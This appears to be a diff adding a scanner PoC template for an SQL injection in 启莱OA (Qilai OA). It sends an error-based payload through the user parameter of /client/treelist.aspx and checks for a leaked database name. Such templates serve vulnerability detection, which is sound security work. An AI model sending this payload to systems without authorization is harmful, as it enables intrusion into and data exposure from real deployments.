@@ -1,0 +1,17 @@
+name: poc-yaml-qilaioa-user-sqli
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /client/treelist.aspx?user=%27%20and%20(select%20db_name())%3E0--&pwd=1
+            follow_redirects: true
+        expression: response.status == 500 && response.body.bcontains(bytes((string('nvarchar'))))
+expression: r0()
+detail:
+    author: xiao1hu
+    links:
+        - https://www.yuque.com/peiqiwiki/peiqi-poc-wiki/sqadqg
+    Affected Version: 启莱OA
